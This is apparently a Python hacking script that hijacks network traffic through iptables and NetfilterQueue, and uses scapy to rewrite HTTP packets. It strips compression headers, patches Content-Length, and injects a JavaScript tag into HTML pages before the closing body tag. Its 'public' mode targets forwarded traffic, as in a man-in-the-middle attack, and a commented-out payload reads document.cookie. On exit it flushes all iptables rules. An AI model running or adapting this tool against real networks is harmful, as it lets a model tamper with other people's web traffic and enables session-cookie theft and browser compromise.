#! /usr/bin/env python

import argparse
import os
import subprocess
import netfilterqueue
import scapy.all as scapy
import re


def getArg():
    parser = argparse.ArgumentParser("File Sniffer")
    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queueNumber", metavar="",
                        help="[?] Number of queue")
    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=80, dest="portList", metavar="",
                        help="[?] Input target app port, you can use pool of port. Default - 80")
    parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                        help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
    parser.add_argument("-e", "--print-traceback", type=int, required=False, default=0, dest="error", metavar="",
                        help="[?] Print traceback, can extremely close the program -> use iptables --flush. "
                             "0 - No; Else Yes")
    return parser.parse_args()
def getPorts(arg):
    port = []
    if not isinstance(arg, int):
        for el in getArg().portList:
            port.append(el)
    else:
        port.append(arg)
    return port

#" alert(document.cookie) "
injectionScript = '<script>console.log(1)</script>'
# injectionScript = "<script>alert(\"1\");</script>"
#injectionScript = "<script>window.onload = function() { alert(1); };</script>"
ack_list = []
tag = "</body>"
byteTag = tag.encode('utf-8')

def decodingLoad(scapy_packet):
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    load = scapy_packet[scapy.Raw].load
    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load.decode("utf-8"))
    scapy_packet[scapy.Raw].load = new_load

    return scapy_packet


def CI(load):
    load = load.decode("utf-8")
    if tag in load:
        print("Injecting...")
        load = load.replace(tag,  injectionScript + tag)
    return load.encode("utf-8")

def packetProccess(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    try:
        if scapy_packet.haslayer(scapy.Raw):

            if scapy_packet.haslayer(scapy.TCP):
                load = scapy_packet[scapy.Raw].load

                for port in getPorts(getArg().portList):

                    if scapy_packet[scapy.TCP].dport == port:
                        # print("Request", end=" ")

                        new_packet = decodingLoad(scapy_packet)
                        packet.set_payload(bytes(new_packet))

                        #print(new_packet.show())

                    elif scapy_packet[scapy.TCP].sport == port:
                        # print("Response")

                        if b'Content-Length' in load:
                            contentLength = re.search(b'Content-Length:\s(\d*)', load)
                            if contentLength:
                                contentLengthNumber = contentLength.group(1).decode('utf-8')
                                newContentLength = int(contentLengthNumber) + len(injectionScript)
                                load = load.replace(contentLengthNumber.encode('utf-8'), str(newContentLength).encode('utf-8'))

                        if b"<!doctype html>" in load or b"<!DOCTYPE html>" in load:
                            ack_list.append(scapy_packet[scapy.TCP].ack)
                            print(f"Get ack: {scapy_packet[scapy.TCP].ack}")




                        if re.search(byteTag, load) and scapy_packet[scapy.TCP].ack in ack_list:
                            load = CI(load)
                            scapy_packet[scapy.Raw].load = load

                            del scapy_packet[scapy.IP].len
                            del scapy_packet[scapy.IP].chksum
                            del scapy_packet[scapy.TCP].chksum

                            packet.set_payload(bytes(scapy_packet))

                            print(scapy_packet.show())

    except Exception as e:
        if getArg().error == 0:
            print(e)
        else:
            subprocess.call(["iptables", "--flush"])
            print(e.with_traceback())
    packet.accept()


def fileSnif():
    if os.getuid() != 0:
        print("Use super user mod")
        exit()

    if getArg().usage == 0:
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Local")
        print("-" * 20)
    else:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Public")
        print("-" * 20)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(getArg().queueNumber, packetProccess)
    queue.run()


if __name__ == '__main__':
    try:
        print(f"Ports: {getArg().portList}")
        if getArg().error == 0:
            print("Traceback: No")
        else:
            print("Traceback: Yes")
        fileSnif()
    except KeyboardInterrupt:
        subprocess.call(["iptables", "--flush"])
        print("\nDetected ctrl + C")
        exit()
